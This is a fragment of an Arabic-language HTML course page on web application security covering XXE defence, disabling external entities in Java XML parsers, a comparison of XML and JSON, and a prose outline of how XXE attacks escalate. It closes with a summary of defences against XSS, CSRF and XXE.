+    <div class="code-box">
+<span class="c">// Java — disable DOCTYPE declarations (which enable external entities)</span>
+factory.setFeature(
+    <span class="s">"http://apache.org/xml/features/disallow-doctype-decl"</span>,
+    <span class="n">true</span>
+);
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; محللات <span class="term">Java XML</span> محفوفة بالمخاطر بشكل خاص</h4>
+        <p>تُحذّر <span class="term">OWASP</span> تحديدًا أن كثيرًا من محللات <span class="term">Java</span> المستندة إلى <span class="term">XML</span> تُمكّن الكيانات الخارجية <strong>بشكل افتراضي</strong>. قد يختلف الإعداد الافتراضي حسب اللغة والمحلل — تحقق دائمًا من توثيق محللك صراحةً. لا تفترض أبدًا أن الكيانات الخارجية معطّلة.</p>
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; سطر إعداد واحد</h4>
+        <p><span class="term">XXE</span> من أسهل الثغرات إصلاحًا وأكثرها خطورة إذا تُركت دون إصلاح. تحقق دائمًا من إعداد محلل <span class="term">XML</span> قبل نشر أي تطبيق يعالج <span class="term">XML</span> أو الصيغ المشتقة منه (بما فيها <span class="term">SVG</span>).</p>
+    </div>
+</div>
+
+<!-- ════════ XML مقابل JSON ════════ -->
+<div id="xxe-json" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128260;</div>
+        <h2>تقييم صيغ البيانات البديلة — <span class="term">XML</span> مقابل <span class="term">JSON</span></h2>
+    </div>
+
+    <p>إذا كان تطبيقك يستخدم <span class="term">XML</span> فحسب لحمولات البيانات المهيكلة (وليس للعرض أو التحقق من الرسم البياني)، فإن التحول إلى <strong><span class="term">JSON</span> يُزيل مخاطر <span class="term">XXE</span> كليًا</strong>. يخزن <span class="term">JSON</span> أزواج مفاتيح/قيم بصيغة نصية وليس له آلية للإشارة إلى ملفات خارجية.</p>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>الفئة</th>
+                <th><span class="term">XML</span></th>
+                <th><span class="term">JSON</span></th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>حجم الحمولة</strong></td>
+                <td>كبير</td>
+                <td>مضغوط</td>
+            </tr>
+            <tr>
+                <td><strong>تعقيد المواصفات</strong></td>
+                <td>عالٍ</td>
+                <td>منخفض</td>
+            </tr>
+            <tr>
+                <td><strong>سهولة الاستخدام</strong></td>
+                <td>يتطلب تحليلًا معقدًا</td>
+                <td>بسيط — يُعيَّن مباشرةً إلى كائنات <span class="term">JavaScript</span></td>
+            </tr>
+            <tr>
+                <td><strong>دعم البيانات الوصفية</strong></td>
+                <td>نعم (السمات)</td>
+                <td>لا</td>
+            </tr>
+            <tr>
+                <td><strong>التحقق من الرسم البياني</strong></td>
+                <td>مدعوم (<span class="term">XSD</span>)</td>
+                <td>غير مدمج</td>
+            </tr>
+            <tr>
+                <td><strong>العرض (مشابه لـ <span class="term">HTML</span>)</strong></td>
+                <td>سهل (<span class="term">XML</span> يشبه <span class="term">DOM</span>)</td>
+                <td>صعب</td>
+            </tr>
+            <tr>
+                <td><strong>قابلية القراءة</strong></td>
+                <td>منخفضة</td>
+                <td>عالية</td>
+            </tr>
+            <tr>
+                <td><strong>الأمان</strong></td>
+                <td>أقل (كيانات خارجية، <span class="term">DTDs</span>)</td>
+                <td>أعلى (لا آلية لتنفيذ الرمز)</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>متى تستخدم أيهما</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>استخدم <span class="term">JSON</span> عندما...</h4>
+            <p>تُرسل واجهتك البرمجية بيانات مهيكلة يفسرها <span class="term">JavaScript</span>. <span class="term">JSON</span> أخف وأبسط وأكثر أمانًا بطبيعته. هو الاختيار الافتراضي لواجهات <span class="term">REST</span> الحديثة.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>أبقِ على <span class="term">XML</span> عندما...</h4>
+            <p>يعالج تطبيقك وثائق <span class="term">XML</span> فعلية أو ملفات <span class="term">SVG</span> أو يتطلب التحقق الصارم من الرسم البياني بواسطة <span class="term">XSD</span>. في هذه الحالات، عطّل الكيانات الخارجية وتحقق بصرامة.</p>
+        </div>
+    </div>
+
+    <div class="info-box">
+        <h4>&#128161; بدائل أخرى</h4>
+        <p>إذا لم يكن <span class="term">JSON</span> مناسبًا، فإن <span class="term">YAML</span> و<span class="term">BSON</span> و<span class="term">EDN</span> كلها بدائل قابلة للتطبيق — لكن يجب إخضاع كل منها لتحليل أمني مماثل قبل اعتمادها.</p>
+    </div>
+</div>
+
+<!-- ════════ مخاطر XXE المتقدمة ════════ -->
+<div id="xxe-advanced" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#9888;&#65039;</div>
+        <h2>مخاطر <span class="term">XXE</span> المتقدمة — التصعيد</h2>
+    </div>
+
+    <p>كثيرًا ما تبدأ هجمات <span class="term">XXE</span> كـ <strong>وصول للقراءة فحسب</strong> — يقرأ المهاجم ملفات من نظام ملفات الخادم عبر مراجع الكيانات الخارجية. غير أن هذا الوصول الأولي كثيرًا ما يُشكّل <strong>بوابة لهجمات أكثر خطورة</strong>.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; من الكتاب — XXE كهجوم بوابة</div>
+        <p>يمنح <span class="term">XXE</span> المهاجم منصة استطلاع تُتيح له الوصول إلى بيانات يتعذر الوصول إليها من خارج خادم الويب. باستخدام هذه البيانات — ملفات الإعداد والبيانات الاعتمادية وعناوين الشبكة الداخلية — يمكن اختراق أجزاء أخرى من التطبيق بسهولة أكبر.</p>
+    </div>
+
+    <h3>مسار تصعيد <span class="term">XXE</span></h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>وصول للقراءة فحسب للملفات</strong><br>
+                يقرأ المهاجم ملفات حساسة — <code>/etc/passwd</code>، ملفات إعداد التطبيق، بيانات اعتماد قاعدة البيانات، مفاتيح <span class="term">API</span>.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>فحص الشبكة الداخلية</strong><br>
+                باستخدام <span class="term">XXE</span> لإرسال طلبات إلى عناوين <span class="term">IP</span> الداخلية، يرسم المهاجم طوبولوجيا الشبكة الداخلية ويكتشف خدمات أخرى.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">3</div>
+            <div>
+                <strong>تنفيذ التعليمات البرمجية عن بُعد</strong><br>
+                بالبيانات الاعتمادية المسروقة ومعرفة الشبكة الداخلية، يمكن للمهاجم المحتمل تحقيق سيطرة كاملة على الخادم — أبعد بكثير من نقطة الدخول الأولية «للقراءة فحسب» عبر <span class="term">XXE</span>.
+            </div>
+        </li>
+    </ol>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; لا تستهن بـ <span class="term">XXE</span> أبدًا</h4>
+        <p>يمكن أن يتراوح التأثير النهائي لهجوم <span class="term">XXE</span> بين الكشف البسيط عن البيانات وصولًا إلى <strong>تنفيذ التعليمات البرمجية عن بُعد والسيطرة الكاملة على الخادم</strong>. إمكانية التصعيد هذه هي سبب تصنيف <span class="term">XXE</span> كإحدى أخطر ثغرات تطبيقات الويب — ولماذا يجب معالجته حتى عندما يبدو التأثير الفوري مقتصرًا على قراءة الملفات.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ════════ الملخص ════════ -->
+<div id="summary" class="summary-banner">
+    <h3>&#128737; ملخص الفصول 22–24 — الدفاع ضد هجمات XSS وCSRF وXXE</h3>
+    <ul>
+        <li>يبدأ دفاع <span class="term">XSS</span> بقاعدة أساسية: لا تسمح أبدًا لبيانات المستخدم غير المنقّاة بالدخول إلى <span class="term">DOM</span> — استخدم <span class="term">innerText</span> بدلًا من <span class="term">innerHTML</span> وتحقق من أن المدخلات شبيهة بالنصوص</li>
+        <li>واجهات <span class="term">DOM</span> الخطيرة (<span class="term">innerHTML</span> و<span class="term">DOMParser</span> و<span class="term">SVG</span> و<span class="term">Blob</span> و<span class="term">document.write</span>) هي مصارف <span class="term">XSS</span> الرئيسية — تجنبها أو نقِّ بصرامة</li>
+        <li>يحمي ترميز كيانات <span class="term">HTML</span> المحتوى في عناصر جسم <span class="term">HTML</span> لكن ليس في وسوم <span class="term">script</span> أو <span class="term">CSS</span> أو عناوين <span class="term">URL</span></li>
+        <li>يمكن استخدام <span class="term">CSS</span> كقناة لتسريب البيانات — لا تسمح بأوراق الأنماط التي يرفعها المستخدمون كلما أمكن</li>
+        <li>سياسة أمان المحتوى (<span class="term">CSP</span>) تُقيّد مصادر النصوص البرمجية وتُعطّل <span class="term">unsafe-eval</span>/<span class="term">unsafe-inline</span> على مستوى المتصفح — لكنها لا تحمي من <span class="term">DOM XSS</span></li>
+        <li>يجمع دفاع <span class="term">CSRF</span> بين التحقق من الترويسات (<span class="term">Origin</span> + <span class="term">Referer</span>) ورموز مكافحة <span class="term">CSRF</span> (ذات حالة أو عديمتها) وطلبات <span class="term">GET</span> عديمة الحالة</li>
+        <li>القاعدة الأساسية لـ <span class="term">CSRF</span>: يجب ألا تُعدّل طلبات <span class="term">HTTP GET</span> حالة الخادم أبدًا — هذا يُزيل جميع هجمات <span class="term">CSRF</span> القائمة على الروابط والصور</li>
+        <li>يجب أن تعمل برمجيات مكافحة <span class="term">CSRF</span> الوسيطة على كل طلب وعلى مستوى التطبيق كله — نقطة نهاية واحدة غير محمية تكسر الدفاع بأكمله</li>
+        <li>دفاع <span class="term">XXE</span> بسيط: عطّل الكيانات الخارجية في محلل <span class="term">XML</span> — سطر واحد من الإعداد</li>
+        <li>يُزيل <span class="term">JSON</span> مخاطر <span class="term">XXE</span> كليًا وينبغي تفضيله على <span class="term">XML</span> لحمولات الواجهات البرمجية</li>
+        <li>يمكن أن يتصاعد <span class="term">XXE</span> من وصول للقراءة فحسب إلى تنفيذ التعليمات البرمجية عن بُعد — لا تستهن أبدًا بخطورته</li>
+    </ul>
+</div>
+
+</main>
+</div><!-- /main-layout -->
+</div><!-- /container -->
+
+<!-- التذييل -->
+<footer class="footer">
+    <div class="footer-inner">
+        <div class="footer-brand">CYB 236 &mdash; أمن تطبيقات الويب</div>
+        <div class="footer-links">
+            <a href="../index.html">الصفحة الرئيسية</a>
+            <a href="../week8/index-ar.html">الأسبوع 8</a>
+            <a href="../syllabus.html">المنهج الدراسي</a>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
